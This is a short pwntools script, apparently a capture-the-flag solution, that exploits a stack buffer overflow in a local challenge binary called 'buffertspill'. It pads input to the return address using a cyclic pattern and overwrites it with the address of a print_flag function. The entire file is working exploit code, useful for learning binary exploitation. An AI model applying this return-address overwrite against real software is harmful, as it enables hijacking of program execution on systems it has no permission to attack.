from pwn import *

prog = ELF("./buffertspill")
p = remote("localhost", 50000)
#process("./buffertspill")
#gdb.attach(p)

p.recvuntil("?")
p.sendline(str(0x200))

buf = b''
buf += cyclic_find("uaacvaac") * b'A' # 0x118
buf += p64(prog.symbols['print_flag'])

p.sendline(buf)

p.interactive()
